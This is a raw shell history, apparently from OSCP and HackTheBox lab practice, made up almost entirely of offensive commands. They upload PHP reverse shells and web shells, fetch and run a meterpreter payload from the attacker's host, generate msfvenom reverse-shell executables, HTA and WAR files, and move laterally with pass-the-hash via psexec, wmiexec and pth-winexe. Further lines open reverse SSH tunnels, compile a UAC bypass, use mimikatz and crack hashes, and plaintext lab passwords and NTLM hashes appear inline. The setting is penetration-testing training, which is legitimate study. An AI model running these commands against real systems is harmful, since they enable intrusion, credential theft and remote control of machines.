 5092  2020-10-29 08:23  cat ~/.ssh/id_rsa.pub
 5093  2020-10-29 08:32  sudo netstat -tulpn
 5094  2020-10-29 08:35  mysql --host=127.0.0.1 --port=13306 --user=wp -p
 5095  2020-10-29 08:37  vim 24.5.5.1
 5096  2020-10-29 08:38  vim / 
 5097  2020-10-29 08:38  vim . 
 5098  2020-10-29 08:39  chmod +x 24.5.5.1.py
 5099  2020-10-29 08:39  python 24.5.5.1.py -h
 5100  2020-10-29 09:52  cat 24.5.5.1.py
 5101  2020-11-01 08:32  cd 10.11.1.221
 5102  2020-11-01 08:32  cherrytree defender.ctb
 5103  2020-11-01 09:06  cp /home/kali/Downloads/PStoolsffs/PsExec64.exe  ~/OSCP/results/10.11.1.21/exploit
 5104  2020-11-02 06:10  cp /usr/share/exploitdb/exploits/jsp/webapps/42966.py ./
 5105  2020-11-02 06:10  python 42966.py -u http://10.11.1.209:8080/
 5106  2020-11-02 06:11  python 42966.py -p http://10.11.1.209:8080/
 5107  2020-11-02 06:12  python 42966.py -u http://10.11.1.209:8080/ -p pwn
 5108  2020-11-02 06:12  searchsploit apache tomcat
 5109  2020-11-02 07:30  locate / | grep  PsExec
 5110  2020-11-02 07:31  locate / | grep  Psexec
 5111  2020-11-02 07:32  cd /home/kali/.local/bin/
 5112  2020-11-02 08:15  cd 10.3.3.190
 5113  2020-11-02 08:16  cd cd ..
 5114  2020-11-02 08:16  cd exploits
 5115  2020-10-27 10:06  serachsploit bizuno
 5116  2020-10-27 10:06  searchsploit bizuno
 5117  2020-10-27 10:07  searchsploit bizu
 5118  2020-10-27 10:07  searchsploit biz
 5119  2020-10-27 10:12  dirb
 5120  2020-10-27 10:12  dirsearch
 5121  2020-10-27 10:12  dirserach
 5122  2020-10-27 10:13  dirbuster
 5123  2020-10-27 10:22  curl http://10.11.1.123/Books/robots.txt
 5124  2020-10-28 06:03  touch shell.php
 5125  2020-10-28 06:03  vim sh`
 5126  2020-10-28 06:07  curl -F "files=@whoami" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/\n
 5127  2020-10-28 06:10  searchsploit jQuery
 5128  2020-10-28 06:10  vim multiple/webapps/11218.txt
 5129  2020-10-28 06:11  vim /usr/share/exploitdb/exploits/multiple/webapps/11218.txt
 5130  2020-10-28 06:11  cp /usr/share/webshells/php/php-reverse-shell.php ./
 5131  2020-10-28 06:12  echo php-reverse-shell.php > shell.php
 5132  2020-10-28 06:12  cat php-reverse-shell.php > shell.php
 5133  2020-10-28 06:13  curl -F "files=@shell.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/\n
 5134  2020-10-28 06:20  curl -F "files=@shell.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/lol\n
 5135  2020-10-28 07:12  curl -F "files=@php-reverse-shell.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/
 5136  2020-10-28 07:16  df- h
 5137  2020-10-28 07:16  df -h
 5138  2020-10-28 07:18  touch webshell.php
 5139  2020-10-28 07:18  vim webshell.php
 5140  2020-10-28 19:22  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD linux/x86/meterpreter/reverse_tcp;\\nset LHOST 192.168.119.217;\\nset LPORT 443;\\nrun"
 5141  2020-10-28 22:15  touch ~/.ssh/authorized_keys
 5142  2020-10-28 22:28  sudo kill -9 17632
 5143  2020-10-28 22:28  sudo kill -9 15843
 5144  2020-10-28 22:28  sudo kill -9 15944
 5145  2020-10-28 22:28  sudo netstat -tupn
 5146  2020-10-28 22:29  ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.217
 5147  2020-10-28 22:30  ssh -f -N -R 1122:10.5.5.10:22 -R 13306:10.5.5.10:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.217
 5148  2020-10-28 22:31  ssh -f -N -R 1122:10.4.4.10:22 -R 13306:10.4.4.10:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.217
 5149  2020-10-29 01:51  vim ~/.ssh/authorized_keys
 5150  2020-10-29 01:52  source ~/.ssh/authorized_keys
 5151  2020-10-29 08:47  ccd
 5152  2020-10-29 08:50  python 24.5.5.1.py
 5153  2020-10-29 08:52  vim 24.5.5.1.py
 5154  2020-10-29 08:52  python 24.5.5.1.py --username root --password BmDu9xUHKe3fZi3Z7RdMBeb
 5155  2020-10-30 08:35  cd admin_dept
 5156  2020-10-30 09:11  java
 5157  2020-10-30 09:11  javac
 5158  2020-10-30 09:31  vim
 5159  2020-10-30 09:54  cd /home/kali/OSCP/results/10.11.1.220/exploit/
 5160  2020-10-30 09:59  find / 2>/dev/null | grep netcat.exe
 5161  2020-10-30 10:01  find / 2>/dev/null | grep netcat
 5162  2020-10-30 10:01  cd /home/kali/Downloads/netcat-1.11/
 5163  2020-10-30 10:18  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.217 LPORT=443  -f exe > rev.exe
 5164  2020-11-01 00:41  XorPasswordIsDead17
 5165  2020-11-01 00:41  daisy
 5166  2020-11-01 00:42  rdesktop -u daisy 10.11.1.122
 5167  2020-11-01 02:10  cd mimikatz2.1.1/x64
 5168  2020-11-01 04:45  gobuster dir -u http://10.11.1.21/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" 
 5169  2020-11-01 04:51  vim downloadword.docx
 5170  2020-11-01 04:56  cat ~/OSCP/5/crackedpasswordalice.txt
 5171  2020-11-01 05:03  rdesktop -u alice -p aliceishere 10.11.1.22
 5172  2020-11-01 05:03  rdesktop -u alice -p aliceishere 10.11.1.21
 5173  2020-11-01 09:32  locate / | grep  eventvwr-bypassuac.c
 5174  2020-11-01 19:15  sudo ftp  10.11.1.22
 5175  2020-11-01 19:32  locate / | grep evil.hta
 5176  2020-11-01 19:32  cp /home/kali/evil.hta ./
 5177  2020-11-01 19:38  sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
 5178  2020-11-01 19:42  sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f hta-psh -o /var/www/html/evil.hta
 5179  2020-11-01 19:43  rm evil.hta
 5180  2020-11-01 20:04  git commit -m "fininshed peter"
 5181  2020-11-01 23:14  ping 10.11.1.22
 5182  2020-11-01 23:14  ftp 10.11.1.22
 5183  2020-11-01 23:15  ping 10.11.1.21
 5184  2020-11-02 00:37  cd 21
 5185  2020-11-02 00:37  touch uac.c
 5186  2020-11-02 00:38  rm bypassuac-x64.exe
 5187  2020-11-02 00:57  x86_64-w64-mingw32-gcc uac.c -o eventvwr-bypassuac-64.exe
 5188  2020-11-02 08:45  touch petepass
 5189  2020-11-02 08:45  vim petepass
 5190  2020-11-02 08:45  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt petepass
 5191  2020-11-02 08:47  /usr/sbin/john  petepass --show
 5192  2020-11-02 09:47  vim l
 5193  2020-11-02 09:47  vim 42341.c
 5194  2020-11-02 09:53  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
 5195  2020-11-02 09:54  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 5196  2020-11-02 10:02  i686-w64-mingw32-gcc fixingtheexploit.c -o mp3.exe -lws2_32
 5197  2020-11-02 10:03  wine mp3.exe
 5198  2020-11-02 10:10  vim  fixingtheexploit.c
 5199  2020-11-02 10:14  python 44976.py
 5200  2020-11-02 10:14  vim 44976.py
 5201  2020-11-02 10:14  vim 35513.py
 5202  2020-11-02 10:15  vim 38382.py
 5203  2020-11-02 10:15  vim crash2.py
 5204  2020-11-02 10:32  python crash2.py
 5205  2020-11-01 19:16  cd rs
 5206  2020-11-01 19:17  10.11.1.229
 5207  2020-11-01 19:18  cherrytree mail.ctb
 5208  2020-11-01 19:19  locate / | grep hta
 5209  2020-11-01 19:20  cp /home/kali/evil.hta ../exploit
 5210  2020-11-01 22:54  sudo impacket-smbserver SPITFIRE  /home/OSCP/results/10.11.1.21/exploit \n
 5211  2020-11-01 22:55  sudo impacket-smbserver SPITFIRE  /home/kali/OSCP/results/10.11.1.21/exploit \n
 5212  2020-11-01 22:56  sudo impacket-smbserver SPITFIRE  /home/kali/OSCP/results/10.11.1.21/\n
 5213  2020-11-01 23:03  cd report/l\n: 1604271827:0;cd report
 5214  2020-11-01 23:42  locate / | grep pdf
 5215  2020-11-01 23:46  locate / | grep .msf4/local
 5216  2020-11-01 23:47  cd /home/kali/.msf4/local
 5217  2020-11-01 23:47  sudo msfconsole -q
 5218  2020-11-01 23:49  cd /root/.msf4/local/malicious.pdf
 5219  2020-11-01 23:49  cd /root/.msf4/local/
 5220  2020-11-02 00:22  locate / | grep strings64.exe
 5221  2020-11-02 00:25  cd OSCP/results/10.11.1.21/exploit
 5222  2020-11-02 00:25  cp ~/Downloads/Strings.zip ./
 5223  2020-11-02 00:25  unzeip Strings.zip
 5224  2020-11-02 00:25  unzip Strings.zip
 5225  2020-11-02 01:04  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=1234 -f exe > shellp1234.exe
 5226  2020-11-02 01:17  vim uac.c
 5227  2020-11-02 01:19  touch offsecpasswd.txt
 5228  2020-11-02 01:19  vim offsecpasswd.txt
 5229  2020-11-02 01:20  /usr/sbin/john --format=LM --rules -w=/usr/share/wordlists/rockyou.txt offsecpasswd.txt
 5230  2020-11-02 01:21  locate / | grep PsExec64.exe
 5231  2020-11-02 01:30  /home/kali/.local/bin/psexec.py alice@10.11.1.20
 5232  2020-11-02 01:31  /home/kali/.local/bin/psexec.py alice@10.11.1.21
 5233  2020-11-02 01:31  /home/kali/.local/bin/psexec.py alice@10.11.1.24
 5234  2020-11-02 01:35  /home/kali/.local/bin/psexec.py alice:ThisIsTheUsersPassword01@10.11.1.24 cmd -path c:\\windows\\system32\\ 
 5235  2020-11-02 01:35  /home/kali/.local/bin/psexec.py alice:ThisIsTheUsersPassword01@10.11.1.21 cmd -path c:\\windows\\system32\\ 
 5236  2020-11-02 01:36  /home/kali/.local/bin/psexec.py alice:ThisIsTheUsersPassword01@10.11.1.20 cmd -path c:\\windows\\system32\\ 
 5237  2020-11-02 01:46  pth-winexe -U alice%7f004ce6b8f7b2a3b6c477806799b9c0:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.217.10 cmd
 5238  2020-11-02 01:46  pth-winexe -U alice%7f004ce6b8f7b2a3b6c477806799b9c0:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.1.20 cmd
 5239  2020-11-02 01:47  pth-winexe -U svcorp/alice%7f004ce6b8f7b2a3b6c477806799b9c0:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.1.20 cmd
 5240  2020-11-02 02:09  /home/kali/.local/bin/wmiexec.py  -hashes 7f004ce6b8f7b2a3b6c477806799b9c0:09d9c245034a155bc5a72d99f053faeb alice@10.11.1.20
 5241  2020-11-02 02:12  locate / | grep psexec.py
 5242  2020-11-02 02:12  psecxec
 5243  2020-11-02 02:12  /home/kali/.local/bin/psexec.py
 5244  2020-11-02 02:12  psexec
 5245  2020-11-02 02:14  /home/kali/.local/bin/psexec.py svcorp/alice:ThisIsTheUsersPassword01@10.11.1.24 cmd -path c:\\windows\\system32\\ 
 5246  2020-11-02 02:14  /home/kali/.local/bin/psexec.py svcorp/alice:ThisIsTheUsersPassword01@10.11.1.21 cmd -path c:\\windows\\system32\\ 
 5247  2020-11-02 02:21  /home/kali/.local/bin/psexec.py svcorp/alice:ThisIsTheUsersPassword01@10.11.1.20 cmd -path c:\\windows\\system32\\ 
 5248  2020-11-02 02:37  touch spary.ps1
 5249  2020-11-02 02:45  vim spary.ps1
 5250  2020-11-02 02:48  /home/kali/.local/bin/psexec.py svcorp/alice:ThisIsTheUsersPassword01@10.11.1.20 cmd.exe -path c:\\windows\\system32\\ 
 5251  2020-11-02 05:47  ping 10.11.1.209
 5252  2020-11-02 05:48  nmap -Pn Sc 10.11.1.209
 5253  2020-11-02 05:52  nmap -Pn nmap -sC -sV IP 10.11.1.209
 5254  2020-11-02 05:53  nmap -Pn  -sC -sV IP 10.11.1.209
 5255  2020-11-02 05:58  nmap -Pn  -sC -sV 10.11.1.209
 5256  2020-11-02 05:58  nmap  -sC -sV 10.11.1.209
 5257  2020-11-02 06:04  serachsploit Apache Tomcat 9.0.27
 5258  2020-11-02 06:04  searchsploit Apache Tomcat 9.0.27
 5259  2020-11-02 06:04  searchsploit Apache Tomcat 
 5260  2020-11-02 06:07  autorecon 10.11.1.209
 5261  2020-11-02 06:17  #msfvenom -p java/shell_reverse_tcp lhost=192.168.119.217 lport=4321 -f war -o pwn.war
 5262  2020-11-02 06:17  cd 10.11.1.209
 5263  2020-11-02 06:17  msfvenom -p java/shell_reverse_tcp lhost=192.168.119.217 lport=4321 -f war -o pwn.war
 5264  2020-11-02 06:18  sudo nc -nlvp 4321
 5265  2020-11-02 06:28  touch report.txt
 5266  2020-11-02 06:28  vim report.txt
 5267  2020-11-02 06:32  cd 10.11.1.223
 5268  2020-11-02 06:32  vim 33070.py
 5269  2020-11-02 06:33  cd 10.11.1.227
 5270  2020-11-02 06:33  cherrtree JD.ctb
 5271  2020-11-02 06:33  cherrytree JD.ctb
 5272  2020-11-02 06:34  cherrytree c
 5273  2020-11-02 06:58  cat tcp_4167_http_nikto.txt
 5274  2020-11-02 06:59  cat tcp_4167_http_gobuster.txt
 5275  2020-11-02 07:16  touch encoder.py
 5276  2020-11-02 07:16  vim encoder.py
 5277  2020-11-02 07:16  chmod +x encoder.py
 5278  2020-11-02 07:16  python encoder.py
 5279  2020-11-02 07:16  python encoder.py 192.168.119.217
 5280  2020-11-02 07:16  python encoder.py 192.168.119.217:4321
 5281  2020-11-02 07:16  python encoder.py 192.168.119.217 4321
 5282  2020-11-02 08:53  7f004ce6b8f7b2a3b6c477806799b9c0
 5283  2020-11-02 08:54  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.21
 5284  2020-11-02 08:54  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.20
 5285  2020-11-02 09:05  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.20/home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.24\n
 5286  2020-11-02 09:05  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.24\n
 5287  2020-11-02 09:05  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.22\n
 5288  2020-11-02 09:05  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.23\n
 5289  2020-11-02 09:07  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.21\n
 5290  2020-11-02 09:07  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.20\n
 5291  2020-11-02 09:08  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  peter@10.11.1.20\n
 5292  2020-11-02 09:08  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  peter@10.11.1.21\n
 5293  2020-11-02 09:08  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.21\n
 5294  2020-11-02 09:09  /home/kali/.local/bin/wmiexec.py  -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.20\n
 5295  2020-11-02 09:09  /home/kali/.local/bin\n
 5296  2020-11-02 09:09  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.20\n\n
 5297  2020-11-02 09:10  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.21\n\n
 5298  2020-11-02 09:10  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0  alice@10.11.1.24\n\n
 5299  2020-11-02 09:11  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.22\n
 5300  2020-11-02 09:11  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.21\n
 5301  2020-11-02 09:11  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.20\n
 5302  2020-11-02 09:11  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb  Administrator@10.11.1.24\n
 5303  2020-11-02 09:16  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0f951bc4fdc5dfcd148161420b9c6207 pete@10.11.1.24\n
 5304  2020-11-02 09:16  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0f951bc4fdc5dfcd148161420b9c6207 pete@10.11.1.21\n
 5305  2020-11-02 09:24  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:08df3c73ded940e1f2bcf5eea4b8dbf6 tris@10.11.1.20\n
 5306  2020-10-30 20:23  G++
 5307  2020-10-30 20:23  g++
 5308  2020-10-30 20:23  vim lol.cxx
 5309  2020-10-30 22:13  cherrytree adam.ctb
 5310  2020-10-30 22:29  locate /  | grep mimikatz
 5311  2020-10-31 21:54  cherrytree xor-app59.ctb
 5312  2020-10-31 22:45  mv mimikatz_trunk\(1\).zip ~/OSCP/results/10.11.1.121/exploit
 5313  2020-10-31 22:45  cd ~
 5314  2020-10-31 23:02  \k
 5315  2020-10-31 23:02  cd 10.11.1.111
 5316  2020-10-31 23:02  cherrytree insider.ctb
 5317  2020-10-31 23:08  vim sa_pass.txt
 5318  2020-11-01 00:07  rm -rf *
 5319  2020-11-01 00:07  git clone https://github.com/caday00/mimikatz2.1.1.git
 5320  2020-11-01 00:09  unzip mimikatz_trunk.zip
 5321  2020-11-01 01:52  rdesktop -u david  10.11.1.120
 5322  2020-11-01 04:49  proxychains wfuzz -c -w ./winlfi2.txt -u https://10.2.2.86/browse.php\?p\=source\&file\=FUZZ  --hw 235,234,236,237,238
 5323  2020-11-01 05:16  python wordmacrokali.py
 5324  2020-11-01 05:28  mv Doc1.docx ~/OSCP/results/10.11.1.21/exploit
 5325  2020-11-01 05:32  ssh alice@10.11.1.50
 5326  2020-11-01 05:33  rdesktop -u alice -p aliceishere  10.11.1.19
 5327  2020-11-01 05:33  rdesktop -u alice -p aliceishere  10.11.1.18
 5328  2020-11-01 05:34  rdesktop -u alice -p aliceishere  10.11.1.20
 5329  2020-11-01 05:40  rdesktop -u alice -p aliceishere  10.11.1.24
 5330  2020-11-01 05:43  vim wordmacro.py
 5331  2020-11-01 05:43  vim wordmacrokali.py
 5332  2020-11-01 05:45  cd ~/OSCP/results/10.11.1.21/exploit
 5333  2020-11-01 05:57  sudo -H pip install -U oletools
 5334  2020-11-01 06:01  vim Doc1.docx
 5335  2020-11-01 08:33  evil-winrm -i 10.11.1.21 -u alice -p 'ThisIsTheUsersPassword01' 
 5336  2020-11-01 08:34  evil-winrm -i 10.11.1.24 -u alice -p 'ThisIsTheUsersPassword01' 
 5337  2020-11-01 08:44  find / 2>/dev/null | grep mimikatz
 5338  2020-11-01 08:45  cd /home/kali/OSCP/it_dept/results/10.1.1.235/exploit/x64/mimikatz.exe
 5339  2020-11-01 08:45  cd /home/kali/OSCP/it_dept/results/10.1.1.235/exploit/x64/
 5340  2020-11-01 08:48  cd /home/kali/oscpdata/rev.exe
 5341  2020-11-01 08:48  cd /home/kali/oscpdata/
 5342  2020-11-01 08:49  sudo msfconsole -q -x "use exploit/multi/handler;\\nset PAYLOAD windows/meterpreter/reverse_tcp;\\nset LHOST 192.168.119.217;\\nset LPORT 443;\\nrun"
 5343  2020-11-01 19:18  sup3rs3cr3t
 5344  2020-11-01 20:04  sudo ftp 10.11.1.21
 5345  2020-11-02 01:12  cherrytree SVCLIENT08.ctb
 5346  2020-11-02 07:03  cd 10.11.1.222
 5347  2020-11-02 07:03  cherrytree chris.ctb
 5348  2020-11-02 09:19  /home/kali/.local/bin/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0f951bc4fdc5dfcd148161420b9c6207 pete@10.11.1.20
 5349  2020-11-02 10:30  rdesktop -u administrator -p lab  192.168.217.10
 5350  2020-11-02 20:56  msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.217.10 LPORT=4444  -f exe > rev.exe
 5351  2020-11-02 20:56  msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.217.10 LPORT=4444  -f exe > revwindowstowindows.exe
 5352  2020-11-02 21:01  #msfvenom -p windows/  /reverse_tcp LHOST=172.16.217.10 LPORT=4444  -f exe > revwindowstowindows.exe
 5353  2020-11-02 21:01  #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=1234 -f exe > shell.exe
 5354  2020-11-02 21:02  #msfvenom -p windows/shell_reverse_tcp LHOST=172.16.217.10 LPORT=4444  -f exe > revwindowstowindows.exe
 5355  2020-11-02 21:02  msfvenom -p windows/shell_reverse_tcp LHOST=172.16.217.10 LPORT=4444  -f exe > revwindowstowindows.exe
 5356  2020-11-02 21:20  cd /home/kali/OSCP/results/10.11.1.123/exploit/rev.exe
 5357  2020-11-02 21:20  cd /home/kali/OSCP/results/10.11.1.123/exploit/
 5358  2020-11-02 23:03  cd 10.11.1.128
 5359  2020-11-02 23:05  cherrytree CTF_template.ctb~
 5360  2020-11-02 23:07  git commit -m "finished oscp"
 5361  2020-11-02 21:24  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f exe > shell.exe
 5362  2020-11-06 11:49  h
 5363  2020-11-06 11:52  cat /dev/null
 5364  2020-11-06 11:52  cat /dev/bus
 5365  2020-11-06 11:52  cat./
 5366  2020-11-07 08:56  rm adduser.exe dead.letter evil.txt.php lol.cxx met.exe passwd shell.exe rev.exe revwindowstowindows.exe useradd.exe
 5367  2020-11-07 08:56  rm hs_err_pid1787.log hs_err_pid18062.log hs_err_pid38324.log hs_err_pid39130.log
 5368  2020-11-07 08:57  vim setup.rc
 5369  2020-11-07 08:57  rm setup.rc
 5370  2020-11-07 08:57  rm shell_reverse_msf_encoded_embedded.exe
 5371  2020-11-07 08:57  rm evil.hta tcp_22_ssh_hydra.txt 
 5372  2020-11-07 08:57  cd keys
 5373  2020-11-07 08:57  cd debian-ssh
 5374  2020-11-07 08:58  rm -rf keys
 5375  2020-11-07 08:58  cd perl5
 5376  2020-11-07 09:03  touch create_direcotry.sh
 5377  2020-11-07 09:04  locate multiple/webapps/11218.txt
 5378  2020-11-07 09:04  locate jsp/webapps/42966.py
 5379  2020-11-07 09:04  vim /usr/share/exploitdb/exploits/jsp/webapps/42966.py
 5380  2020-11-07 11:00  chomd +x create_direcotry.sh
 5381  2020-11-07 11:00  chmod +x create_direcotry.sh
 5382  2020-11-07 11:00  ./create_direcotry.sh
 5383  2020-11-07 11:01  rm -rf {\{34\}
 5384  2020-11-07 11:03  mkdir {dir1,dir2,dir3,dir4}
 5385  2020-11-07 11:04  rm {\{34\}
 5386  2020-11-07 11:04  rmdir {\{34\}
 5387  2020-11-07 11:04  rmdir -r {\{34\}
 5388  2020-11-07 11:04  rmdir '{34}'
 5389  2020-11-07 11:04  rm -rf dir1 dir2 dir3 dir4
 5390  2020-11-07 11:08  ./create_direcotry.sh 34
 5391  2020-11-07 11:08  cd 34
 5392  2020-11-07 11:09  rm -rf 34
 5393  2020-11-07 11:25  ./create_direcotry.sh 11
 5394  2020-11-07 11:25  rm -rf 11
 5395  2020-11-07 11:25  echo lol
 5396  2020-11-07 11:25  echo lol\nlol
 5397  2020-11-07 11:26  echo $'hello\nworld'\n
 5398  2020-11-07 11:26  echo 'hello\nworld'\n
 5399  2020-11-07 11:26  echo "hello\nworld"\n
 5400  2020-11-07 11:37  cp _manual_commands.txt ~/HTB
 5401  2020-11-07 08:52  autorecon 10.11.1.198
 5402  2020-11-07 10:24  cd 10.11.1.198
 5403  2020-11-07 10:25  rm -rf 10.11.1.198
 5404  2020-11-07 10:25  autorecon 10.10.10.198
 5405  2020-11-07 11:28  cat tcp_8080_http_gobuster.txt
 5406  2020-11-07 11:29  searchsploit Gym Management Software 1.0
 5407  2020-11-07 11:29  searchsploit Gym Management
 5408  2020-11-07 11:29  locate php/webapps/48506.py
 5409  2020-11-07 11:29  vim /usr/share/exploitdb/exploits/php/webapps/48506.py
 5410  2020-11-07 11:30  cp  /usr/share/exploitdb/exploits/php/webapps/48506.py ./
 5411  2020-11-07 11:30  ./48506.py
 5412  2020-11-07 11:30  python 48506.py
 5413  2020-11-07 11:30  ./48506.py http://10.10.10.198:8080/
 5414  2020-10-27 06:43  cd 122
 5415  2020-10-27 06:44  cd 10.11.1.122
 5416  2020-10-27 06:44  cat tcp_47001_http_nikto.txt
 5417  2020-10-27 07:06  cast tcp_47001_http_robots.txt
 5418  2020-10-27 07:06  cat tcp_47001_http_robots.txt
 5419  2020-10-27 07:10  autorecon 10.11.1.123
 5420  2020-10-28 01:15  vim 46249.py
 5421  2020-10-28 05:14  :wq
 5422  2020-10-28 06:01  curl -F "files=@shell.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/
 5423  2020-10-28 09:12  rg
 5424  2020-10-28 09:56  d /usr/share/seclists/Web-Shells/WordPress
 5425  2020-10-28 09:56  vim plugin-shell.php
 5426  2020-10-28 09:59  cp plugin-shell.zip ~/oscpdata
 5427  2020-10-28 10:02  curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
 5428  2020-10-28 10:03  curl http://sandbox.local/wp-admin/plugins/?plugin-shell/plugin-shell.php
 5429  2020-10-28 10:04  curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php
 5430  2020-10-28 10:04  curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd\=whoami
 5431  2020-10-28 10:04  curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd=whoami
 5432  2020-10-28 10:05  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.217 LPORT=443 -f elf > shell.elf
 5433  2020-10-28 10:07  curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd=wget%20http://192.168.119.217/shell.elf
 5434  2020-10-28 10:07  curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd=chmod%20%2bx%20shell.elf
 5435  2020-10-28 10:23  git commit -m "finished: .123"
 5436  2020-10-28 19:23  curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php\?cmd=./shell.elf
 5437  2020-10-28 19:44  sudo apt install seclists
 5438  2020-10-28 19:44  cd /usr/share/seclists/Web-Shells/WordPress
 5439  2020-10-28 19:45  sudo rm plugin-shell.zip
 5440  2020-10-28 19:45  sudo zip plugin-shell.zip plugin-shell.php
 5441  2020-10-28 19:46  mv plugin-shell.zip ~/oscpdata
 5442  2020-10-28 19:46  sudo mv plugin-shell.zip ~/oscpdata
 5443  2020-10-28 19:49  touch wordpressrshell.php
 5444  2020-10-28 19:49  vim wordpressrshell.php
 5445  2020-10-28 19:50  sudo zip plugin-shell.zip wordpressrshell.php
 5446  2020-10-28 19:51  sudo zip wprshell.zip wordpressrshell.php
 5447  2020-10-29 08:24  ssh root@sandbox.local
 5448  2020-10-29 19:39  #curl -F "files=@webshell.php" http://10.11.1.123/Books/apps/jquery-file-upload/server/php/
 5449  2020-10-29 19:40  cd 10.11.1.123
 5450  2020-10-30 22:31  cp /home/kali/OSCP/results/10.11.1.123/scans/mimikatz64.exe ./
 5451  2020-10-30 23:14  sudo impacket-smbserver SPITFIRE  /home/kali/oscpdata/  \n
 5452  2020-10-30 23:57  python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt 0-60a10000-xor-app59\$@krbtgt\~XOR.COM-XOR.COM.kirbi
